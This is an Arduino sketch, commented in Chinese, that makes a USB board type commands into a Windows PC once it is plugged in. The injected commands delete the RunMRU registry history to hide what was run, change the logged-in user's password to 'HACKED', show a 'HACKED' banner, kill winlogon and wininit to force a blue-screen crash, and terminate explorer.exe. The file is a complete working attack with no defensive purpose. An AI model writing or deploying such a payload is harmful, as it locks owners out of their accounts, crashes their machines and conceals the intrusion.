#include<Keyboard.h>
void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题
  Keyboard.release(KEY_CAPS_LOCK); //释放大写键
  delay(200);
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(200); 
  Keyboard.press('r');//r键 
  delay(200); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.println("cmd.exe");
  delay(200);
  Keyboard.println("CMD.EXE /C REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&NET USER %USERNAME% HACKED");//修改密码HACKED
  delay(200); 
  Keyboard.println("color a");//更改命令行颜色（绿色）
  delay(200); 
  Keyboard.println("echo ........................................................   >> hacked.txt");//向hacked.txt写内容
  delay(200); 
  Keyboard.println("echo ##     ##    ###     ######  ##    ## ######## ########  >> hacked.txt");//向hacked.txt写内容
  delay(200); 
  Keyboard.println("color 0");//更改命令行颜色（绿色）
  delay(200); 
  Keyboard.println("echo ##     ##   ## ##   ##    ## ##   ##  ##       ##     ##  >> hacked.txt");//向hacked.txt写内容
  delay(200); 
  Keyboard.println("color 1");//更改命令行颜色（绿色）
  delay(200); 
  Keyboard.println("echo ##     ##  ##   ##  ##       ##  ##   ##       ##     ##  >> hacked.txt");//向hacked.txt写内容
  delay(200); 
  Keyboard.println("color 2");//更改命令行颜色（绿色）
  delay(200); 
  Keyboard.println("echo ######### ##     ## ##       #####    ######   ##     ##  >> hacked.txt");//向hacked.txt写内容
  delay(200); 
  Keyboard.println("color 3");//更改命令行颜色（绿色）
  delay(200); 
  Keyboard.println("echo ##     ## ######### ##       ##  ##   ##       ##     ##  >> hacked.txt");//向hacked.txt写内容
  delay(200); 
  Keyboard.println("color 4");//更改命令行颜色（绿色）
  delay(200); 
  Keyboard.println("echo ##     ## ##     ## ##    ## ##   ##  ##       ##     ##  >> hacked.txt");//向hacked.txt写内容
  delay(200); 
  Keyboard.println("color 5");//更改命令行颜色（绿色）
  delay(200); 
  Keyboard.println("echo ##     ## ##     ##  ######  ##    ## ######## ########   >> hacked.txt");//向hacked.txt写内容
  delay(200); 
  Keyboard.println("color 6");//更改命令行颜色（绿色）
  delay(200); 
  Keyboard.println("echo ........................................................   >> hacked.txt");//向hacked.txt写内容
  delay(200); 
  Keyboard.println("color c");//更改命令行颜色（红色）
  delay(200); 
  Keyboard.println("cls");//更改命令行颜色（红色）
  delay(200); 
  Keyboard.println("type hacked.txt");//将hacked.txt文件内容打印在cmd
  delay(200); 
  Keyboard.println("CMD /C START /MIN CMD /C REG DELETE hkcu\\sOFTWARE\\mICROSOFT\\wINDOWS\\cURRENTvERSION\\eXPLORER\\rUNmru /F&CMD /C START /MIN CMD /C NTSD -C Q -PN WINLOGON.EXE 1>NUL 2>NUL&TASKKILL /F /IM WININIT.EXE 2>NUL");//蓝屏XP、7
  delay(200); 
  Keyboard.println("taskkill /f /im explorer.exe");//删除桌面进程(all)
  delay(200); 
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}
